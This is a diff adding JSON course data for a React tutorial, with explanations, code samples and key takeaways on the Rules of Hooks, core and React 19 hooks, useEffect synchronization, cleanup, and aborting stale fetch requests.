+        "code": "import { useState } from 'react';\n\nexport function RegistrationForm({ onSubmit }) {\n  const [values, setValues] = useState({ username: '', email: '', role: 'developer' });\n  const [touched, setTouched] = useState({});\n  const [isSubmitting, setIsSubmitting] = useState(false);\n\n  // Derived validation errors (computed during render):\n  const errors = {\n    username: values.username.length < 3 ? 'Username must be at least 3 characters' : null,\n    email: !/\\S+@\\S+\\.\\S+/.test(values.email) ? 'Enter a valid email address' : null\n  };\n  const isValid = !errors.username && !errors.email;\n\n  function handleChange(e) {\n    const { name, value } = e.target;\n    setValues(prev => ({ ...prev, [name]: value }));\n  }\n\n  function handleBlur(e) {\n    const { name } = e.target;\n    setTouched(prev => ({ ...prev, [name]: true }));\n  }\n\n  async function handleSubmit(e) {\n    e.preventDefault();\n    setTouched({ username: true, email: true });\n    if (!isValid) return;\n\n    setIsSubmitting(true);\n    try {\n      await onSubmit(values);\n    } finally {\n      setIsSubmitting(false);\n    }\n  }\n\n  return (\n    <form onSubmit={handleSubmit} className=\"form-card\" noValidate>\n      <div className=\"field-group\">\n        <label htmlFor=\"reg-username\">Username</label>\n        <input\n          id=\"reg-username\"\n          name=\"username\"\n          value={values.username}\n          onChange={handleChange}\n          onBlur={handleBlur}\n          aria-invalid={Boolean(touched.username && errors.username)}\n        />\n        {touched.username && errors.username && (\n          <span className=\"field-error\" role=\"alert\">{errors.username}</span>\n        )}\n      </div>\n\n      <div className=\"field-group\">\n        <label htmlFor=\"reg-email\">Email</label>\n        <input\n          id=\"reg-email\"\n          name=\"email\"\n          type=\"email\"\n          value={values.email}\n          onChange={handleChange}\n          onBlur={handleBlur}\n          aria-invalid={Boolean(touched.email && errors.email)}\n        />\n        {touched.email && errors.email && (\n          <span className=\"field-error\" role=\"alert\">{errors.email}</span>\n        )}\n      </div>\n\n      <button type=\"submit\" disabled={isSubmitting || (Object.keys(touched).length > 0 && !isValid)}>\n        {isSubmitting ? 'Registering...' : 'Complete Registration'}\n      </button>\n    </form>\n  );\n}",
+        "keyTakeaways": [
+          "Use a single form state object with generic name/value handlers to scale inputs.",
+          "Track touched state to avoid displaying validation errors prematurely.",
+          "Derive form validity inline during render to avoid redundant state and synchronization bugs."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "title": "Part 6 — React Hooks Complete Coverage",
+    "badge": "Hooks Master",
+    "color": "#f43f5e",
+    "sections": [
+      {
+        "id": "6.1",
+        "title": "19. The Rules of Hooks & Fiber Linked List Mechanics",
+        "content": "### 1. The Two Absolute Rules of Hooks\n1. **Only Call Hooks at the Top Level**: Do not call hooks inside loops, conditions, or nested functions.\n2. **Only Call Hooks from React Functions**: Call them from React function components or custom hooks (`use...`).\n\n### 2. Why Hooks Depend on Strict Call Order (Internal Mechanics)\nUnder the hood, React does NOT identify hooks by unique name or key.\nInstead, each Fiber node maintains a singly linked list of **Hook Objects**:\n\nFiber.memoizedState -> Hook1 -> Hook2 -> Hook3 -> null\n\n- On Mount: React builds the linked list in the exact order the hooks are executed.\n- On Re-render: React resets an internal pointer to the head of the list. Each hook call advances the pointer: `currentHook = currentHook.next`.\n- **If a hook is placed inside an `if` statement**: If the condition toggles from `true` to `false`, the second hook is skipped. The internal pointer desynchronizes, causing React to assign Hook 3's state to Hook 2! React crashes with: `Rendered fewer hooks than expected`.",
+        "code": "// ❌ CRITICAL VIOLATION: Conditional Hook Call\nfunction UserProfile({ userId }) {\n  // If userId is null, hook is skipped, corrupting the Fiber linked list!\n  if (!userId) return <p>No user selected</p>;\n  const [user, setUser] = useState(null); // CRASH!\n  return <div>{user?.name}</div>;\n}\n\n// ✅ CORRECT: Hooks always called at top level unconditionally\nfunction UserProfileGood({ userId }) {\n  const [user, setUser] = useState(null);\n\n  // Early returns must ALWAYS occur AFTER all hook declarations!\n  if (!userId) return <p>No user selected</p>;\n  return <div>{user?.name}</div>;\n}",
+        "keyTakeaways": [
+          "React stores hooks as a singly-linked list on the Fiber's memoizedState property.",
+          "Hooks rely entirely on invariant call order between renders to match state with hook instances.",
+          "Never call hooks conditionally; place conditional branches after all hook declarations."
+        ]
+      },
+      {
+        "id": "6.2",
+        "title": "20. Core Hooks Catalog: useState, useReducer, useContext, useRef",
+        "content": "### 1. Overview of Core State & Reference Primitives\n- `useState`: Simple state primitive for localized values.\n- `useReducer`: Predictable state container for complex state transitions following the `(state, action) => newState` pattern.\n- `useContext`: Subscribes a component to a React Context provider, bypassing prop drilling.\n- `useRef`: Returns a mutable ref object whose `.current` property persists across renders without triggering a re-render when mutated.",
+        "code": "import { useState, useReducer, useRef, useContext, createContext } from 'react';\n\n// 1. useReducer state machine:\nfunction counterReducer(state, action) {\n  switch (action.type) {\n    case 'INC': return { count: state.count + 1 };\n    case 'DEC': return { count: Math.max(0, state.count - 1) };\n    case 'RESET': return { count: 0 };\n    default: return state;\n  }\n}\n\n// 2. Context setup:\nconst ThemeContext = createContext('dark');\n\nexport function CoreHooksDemo() {\n  const [state, dispatch] = useReducer(counterReducer, { count: 0 });\n  const theme = useContext(ThemeContext);\n  const renderCountRef = useRef(0);\n\n  // Ref mutation: Does NOT cause re-render!\n  renderCountRef.current += 1;\n\n  return (\n    <div className={`card theme-${theme}`}>\n      <p>Count: {state.count} (Rendered {renderCountRef.current} times)</p>\n      <button onClick={() => dispatch({ type: 'INC' })}>+</button>\n      <button onClick={() => dispatch({ type: 'DEC' })}>-</button>\n      <button onClick={() => dispatch({ type: 'RESET' })}>Reset</button>\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "useReducer is ideal when next state depends on complex logic or multiple sub-values.",
+          "useRef persists values across renders without scheduling a new render cycle.",
+          "useContext enables broad subscription across deeply nested component hierarchies."
+        ]
+      },
+      {
+        "id": "6.3",
+        "title": "21. Modern Concurrent & React 19 Hooks",
+        "content": "### 1. Modern Hooks Landscape\nReact 18 & 19 introduced powerful primitives for concurrent rendering, transitions, and asynchronous operations:\n- `useTransition`: Marks state updates as non-urgent transitions, keeping the input responsive while heavy UI updates render in the background.\n- `useDeferredValue`: Defers updating a non-urgent part of the UI until higher-priority updates finish.\n- `useId`: Generates stable, collision-free unique IDs for accessible form controls across server and client.\n- `useOptimistic` (React 19): Displays optimistic UI state immediately while a server mutation is in flight.\n- `useActionState` (React 19): Simplifies async form actions by managing pending states, action returns, and form values.",
+        "code": "import { useState, useTransition, useDeferredValue, useId } from 'react';\n\nfunction SearchFilter({ allItems }) {\n  const [query, setQuery] = useState('');\n  const [isPending, startTransition] = useTransition();\n  const inputId = useId();\n\n  // Urgent update: Keep the typing input snappy\n  function handleChange(e) {\n    const val = e.target.value;\n    // Low-priority transition: Filter calculation deferred\n    startTransition(() => {\n      setQuery(val);\n    });\n  }\n\n  const filtered = allItems.filter(item => item.name.toLowerCase().includes(query.toLowerCase()));\n\n  return (\n    <div>\n      <label htmlFor={inputId}>Search Records:</label>\n      <input id={inputId} onChange={handleChange} placeholder=\"Type to filter...\" />\n      {isPending && <span className=\"spinner\">Updating list...</span>}\n      <ul>\n        {filtered.slice(0, 20).map(item => <li key={item.id}>{item.name}</li>)}\n      </ul>\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "useTransition prevents UI freezing during heavy calculations by marking updates as interruptible.",
+          "useId guarantees identical, collision-free accessibility IDs across SSR hydration.",
+          "React 19 useOptimistic and useActionState streamline async form mutations."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 7,
+    "title": "Part 7 — useEffect Deep-Dive & Synchronization",
+    "badge": "Effects Deep-Dive",
+    "color": "#fb7185",
+    "sections": [
+      {
+        "id": "7.1",
+        "title": "22. What is an Effect? Synchronization vs Lifecycle",
+        "content": "### 1. Mental Model: Effects are Synchronizations\nThe most critical breakthrough in mastering React is shifting your mental model from class lifecycle methods (`componentDidMount`, `componentDidUpdate`) to **Synchronization**:\n- An Effect is a mechanism to synchronize your component with an **external system** (the browser DOM, a third-party widget, an analytics service, a WebSocket, or an HTTP network request).\n- An Effect runs AFTER React commits changes to the DOM and the browser paints the pixels to the screen.\n\n### 2. When an Effect is Completely Unnecessary\nMany developers misuse `useEffect` for tasks that belong elsewhere:\n1. **Transforming data for rendering**: Do NOT use an effect; calculate it inline as derived state!\n2. **Handling user interactions (clicks, form submissions)**: Do NOT use an effect; put the code inside the event handler!\n3. **Resetting state on prop change**: Do NOT use an effect; use a unique `key` prop!",
+        "code": "// ❌ ANTI-PATTERN: Using useEffect for user event side-effects\nfunction CheckoutBad({ cart, onBuy }) {\n  const [submitted, setSubmitted] = useState(false);\n\n  // Fragile effect watching state toggles\n  useEffect(() => {\n    if (submitted) {\n      api.post('/checkout', cart);\n    }\n  }, [submitted, cart]);\n\n  return <button onClick={() => setSubmitted(true)}>Checkout</button>;\n}\n\n// ✅ BEST PRACTICE: Execute side-effects directly inside event handlers\nfunction CheckoutGood({ cart, onBuy }) {\n  const [isSubmitting, setIsSubmitting] = useState(false);\n\n  async function handleCheckout() {\n    setIsSubmitting(true);\n    try {\n      await api.post('/checkout', cart);\n      onBuy();\n    } finally {\n      setIsSubmitting(false);\n    }\n  }\n\n  return (\n    <button onClick={handleCheckout} disabled={isSubmitting}>\n      {isSubmitting ? 'Processing...' : 'Checkout'}\n    </button>\n  );\n}",
+        "comparisonTable": [
+          { "aspect": "Event Handler", "detail": "Runs in direct response to user interaction (click, submit); ideal for mutations and API calls." },
+          { "aspect": "useEffect", "detail": "Runs after render to synchronize state with an external system (WebSockets, DOM listeners)." },
+          { "aspect": "Derived State", "detail": "Calculated inline during render; zero effects, zero extra renders, zero sync bugs." }
+        ],
+        "keyTakeaways": [
+          "Effects synchronize components with external systems; they are not lifecycle callbacks.",
+          "Never use useEffect to calculate derived state or trigger user-action API requests.",
+          "Keep event logic inside event handlers where the causal user intent originates."
+        ]
+      },
+      {
+        "id": "7.2",
+        "title": "23. Effect Dependencies, Cleanups & Strict Mode",
+        "content": "### 1. Dependency Array Rules\nReact compares dependency array values using `Object.is(prevDep, nextDep)`:\n- **No Dependency Array (`useEffect(fn)`)**: Runs after EVERY render. (Dangerous; causes infinite loops if state is set inside!).\n- **Empty Dependency Array (`useEffect(fn, [])`)**: Runs once on mount; cleanup runs once on unmount.\n- **Dependencies Array (`useEffect(fn, [id, filter])`)**: Runs on mount, and re-runs whenever any dependency changes by reference.\n\n### 2. The Cleanup Function Lifecycle\nWhen you return a cleanup function from an Effect:\n1. React executes the cleanup function **before running the effect again** with the new dependencies.\n2. React executes the cleanup function **when the component unmounts**.\n\n### 3. Strict Mode Double-Invocation in Development\nIn development (`<React.StrictMode>`), React mounts, unmounts, and re-mounts every component immediately:\n\nMount -> Effect Setup -> Effect Cleanup -> Effect Setup\n\nThis intentional stress-test exposes missing cleanup logic (e.g. unclosed WebSockets, duplicate event listeners, or uncleared intervals).",
+        "code": "import { useEffect, useState } from 'react';\n\nfunction LivePriceTicker({ symbol }) {\n  const [price, setPrice] = useState(null);\n\n  useEffect(() => {\n    // 1. Setup Phase: Connect to external WebSocket\n    const socket = new WebSocket(`wss://stream.market.com/quotes?symbol=${symbol}`);\n\n    socket.onmessage = (event) => {\n      const data = JSON.parse(event.data);\n      setPrice(data.price);\n    };\n\n    // 2. Cleanup Phase: Disconnect cleanly when symbol changes or unmounts\n    return () => {\n      socket.close();\n    };\n  }, [symbol]); // Re-runs cleanly when symbol changes!\n\n  return <div>{symbol}: {price ? `$${price}` : 'Connecting...'}</div>;\n}",
+        "keyTakeaways": [
+          "Every variable referenced inside the effect must be declared in the dependency array or placed in a ref.",
+          "Always return a cleanup function to cancel timers, close sockets, or remove DOM event listeners.",
+          "Strict Mode runs Effect setup/cleanup twice in dev to guarantee your cleanup logic is resilient."
+        ]
+      },
+      {
+        "id": "7.3",
+        "title": "24. Race Conditions & AbortController in Fetching",
+        "content": "### 1. The Async Race Condition Vulnerability\nIf a user rapidly switches between tabs or search terms (e.g. searching 'React', then 'Redux'):\n- Request 1 ('React') is sent.\n- Request 2 ('Redux') is sent.\n- If Request 1 takes 2000ms due to network latency, but Request 2 resolves in 300ms, Request 1 resolves LAST and overwrites Request 2's results with stale data!\n\n### 2. The Solution: AbortController or Ignore Flags\nAlways use standard browser **`AbortController`** to abort in-flight HTTP requests when dependencies change or the component unmounts.",
+        "code": "import { useState, useEffect } from 'react';\n\nfunction UserSearch({ query }) {\n  const [results, setResults] = useState([]);\n  const [isLoading, setIsLoading] = useState(false);\n\n  useEffect(() => {\n    if (!query.trim()) {\n      setResults([]);\n      return;\n    }\n\n    // Create an AbortController instance\n    const controller = new AbortController();\n    const { signal } = controller;\n\n    async function fetchUsers() {\n      setIsLoading(true);\n      try {\n        const res = await fetch(`/api/users/search?q=${encodeURIComponent(query)}`, { signal });\n        const data = await res.json();\n        setResults(data);\n      } catch (err) {\n        if (err.name !== 'AbortError') {\n          console.error(\"Fetch error:\", err);\n        }\n      } finally {\n        setIsLoading(false);\n      }\n    }\n\n    fetchUsers();\n\n    // Cleanup: Abort in-flight network request if query changes before response arrives!\n    return () => {\n      controller.abort();\n    };\n  }, [query]);\n\n  return (\n    <div>\n      {isLoading && <p>Searching...</p>}\n      <ul>\n        {results.map(u => <li key={u.id}>{u.name}</li>)}\n      </ul>\n    </div>\n  );\n}",
+        "keyTakeaways": [
+          "Network requests can resolve out of order, leading to stale data overwriting newer state.",
+          "Always pass an AbortController.signal to fetch() inside useEffect.",
+          "Aborting in the cleanup function cancels pending HTTP requests instantly upon dependency changes."
+        ]
+      }
+    ]
+  }
+]
